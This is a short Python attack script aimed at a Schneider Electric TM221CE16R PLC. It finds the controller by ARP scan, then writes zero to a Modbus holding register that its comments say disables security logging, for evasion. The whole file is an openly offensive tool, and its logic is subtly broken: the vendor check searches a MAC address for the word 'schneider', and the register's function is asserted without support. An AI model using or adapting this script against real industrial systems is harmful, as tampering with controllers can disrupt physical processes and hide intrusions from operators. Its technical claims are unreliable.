import socket
import struct
import time
from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient

# Step 1: Discover Schneider Electric TM221CE16R PLC IP via ARP Scan
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning for PLC...")

    # Send ARP requests across the subnet
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    answered, _ = srp(arp_request, timeout=2, verbose=False)

    for sent, received in answered:
        if "schneider" in received.hwsrc.lower():  # Filtering by known vendor MAC address
            print(f"[+] PLC Found: {received.psrc}")
            return received.psrc  

    print("[!] No PLC found.")
    return None

# Step 2: Exploit for Evasion (Example: Disable Security Feature)
def exploit_plc(ip):
    print(f"[*] Connecting to PLC at {ip}...")

    client = ModbusTcpClient(ip)
    if client.connect():
        print("[+] Connected to PLC.")

        # STEP 2.1: Disable Security Logging Feature (Exploit Bypass)
        # Writing to an undocumented memory area to bypass security (Example: Holding Register)
        try:
            write_response = client.write_register(0x64, 0x0000)  # Overwriting specific register
            if write_response.isError():
                print("[!] Exploit failed.")
            else:
                print("[+] Security Feature Disabled (Bypassed)")
        except Exception as e:
            print(f"[!] Error executing exploit: {e}")

        client.close()
    else:
        print("[!] Failed to connect to PLC.")

if __name__ == "__main__":
    # Step 1: Find PLC IP
    plc_ip = find_plc_ip()

    if plc_ip:
        # Step 2: Exploit PLC for evasion
        exploit_plc(plc_ip)